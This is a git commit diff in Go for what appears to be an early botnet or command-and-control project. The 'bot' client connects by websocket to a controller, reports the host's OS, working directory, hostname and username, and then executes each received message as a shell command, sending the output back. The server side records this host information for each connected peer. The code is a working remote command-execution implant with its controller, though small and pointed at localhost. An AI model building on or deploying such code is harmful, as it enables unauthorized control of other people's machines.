4323c7f4841a30761f61219b040d00b98cefea41
Paul Vacey <pvacey@gmail.com>
2021-12-14 22:10:06 -0600

    messages sent to bots run as shell commands on the host. send host context on first connection

--- bot/client.go
+++ bot/client.go
@@ -1,10 +1,22 @@
 package main
 
 import (
+	"fmt"
 	"github.com/gorilla/websocket"
 	"log"
+	"os"
+	"os/exec"
+	"os/user"
+	"runtime"
+	"strings"
 	"time"
 )
+
+type CommandResult struct {
+	command string
+	result  string
+	err     string
+}
 
 func send(c *websocket.Conn, msg string) {
 	err := c.WriteMessage(1, []byte(msg))
@@ -18,6 +30,30 @@ func recieve(c *websocket.Conn) (string, error) {
 	return string(payload), err
 }
 
+// this function needs to create a CommandResult struct and return it
+func commandHandler(c *websocket.Conn, cmd string) {
+	command := strings.Split(cmd, " ")
+	out, err := exec.Command(command[0], command[1:]...).Output()
+	if err != nil {
+		send(c, fmt.Sprint(err))
+	}
+	send(c, string(out))
+}
+
+func getHostInfo() string {
+	pwd, err := os.Getwd()
+	if err != nil {
+		pwd = ""
+	}
+	hostname, err := os.Hostname()
+	if err != nil {
+		pwd = ""
+	}
+	user, err := user.Current()
+	return fmt.Sprintf("%s %s %s %s", runtime.GOOS, pwd, hostname, user.Username)
+}
+
+
 func main() {
 	host := "ws://localhost:8000"
 	log.Println("Connecting to host: ", host)
@@ -28,14 +64,16 @@ func main() {
 	}
 	defer conn.Close()
 
-	send(conn, "hey")
+	// get the initial host info and send it as the first message
+	send(conn, getHostInfo())
+	// after that, wait for commands and respond to them
 	for {
 		msg, err := recieve(conn)
 		if err != nil {
 			log.Println("recieve error: ", err)
 			break
 		}
-		log.Println("recieved message: ", msg)
+		commandHandler(conn, msg)
 	}
 
 	// send the proper disconnect signal to the other end
--- server/peer.go
+++ server/peer.go
@@ -1,8 +1,10 @@
 package main
 
 import (
+	"fmt"
 	"github.com/gorilla/websocket"
 	"log"
+	"strings"
 )
 
 type Peer struct {
@@ -16,6 +18,8 @@ type Peer struct {
 	controller *Controller
 	// the actuall connection to the peer
 	websocket *websocket.Conn
+	// store host information from the first connect message
+	info map[string]string
 }
 
 func initPeer(w *websocket.Conn, c *Controller) *Peer {
@@ -25,6 +29,7 @@ func initPeer(w *websocket.Conn, c *Controller) *Peer {
 		ping:       make(chan bool),
 		websocket:  w,
 		controller: c,
+		info:       map[string]string{},
 	}
 }
 
@@ -32,6 +37,16 @@ func initPeer(w *websocket.Conn, c *Controller) *Peer {
 // the peer's outbox array. god only knows what to do with it then
 // ignore pong messages, once those exist
 func (p *Peer) reader() {
+	_, payload, _ := p.websocket.ReadMessage()
+	log.Println(string(payload))
+
+	p.info["address"] = fmt.Sprint(p.websocket.RemoteAddr())
+	firstMsg := strings.Split(string(payload), " ")
+	p.info["os"] = firstMsg[0]
+	p.info["workingDir"] = firstMsg[1]
+	p.info["hostname"] = firstMsg[2]
+	p.info["username"] = firstMsg[3]
+
 	for {
 		_, payload, err := p.websocket.ReadMessage()
 		// err is returned when the connection is closed by the client
@@ -46,24 +61,26 @@ func (p *Peer) reader() {
 // need to change the loop to watch for both messages in the peer inbox
 // as well as to send a periodic ping message with time.After (use select)
 func (p *Peer) writer() {
-	Looper: for {
+Looper:
+	for {
 		select {
-		case msg := <- p.inbox:
+		case msg := <-p.inbox:
 			err := p.websocket.WriteMessage(1, []byte(msg))
 			if err != nil {
 				log.Println(err)
 				break Looper
 			}
-		case <- p.ping:
+		case <-p.ping:
 			log.Println("sending ping to ", p.websocket.RemoteAddr())
 			err := p.websocket.WriteMessage(websocket.PingMessage, nil)
 			if err != nil {
 				log.Println(err)
 				break Looper
 			}
-			
-		} 
+
+		}
 	}
 	// drop the peer once the loop is broken by an error or some other condition
 	p.controller.removePeer <- p
+	log.Println(p.info)
 }
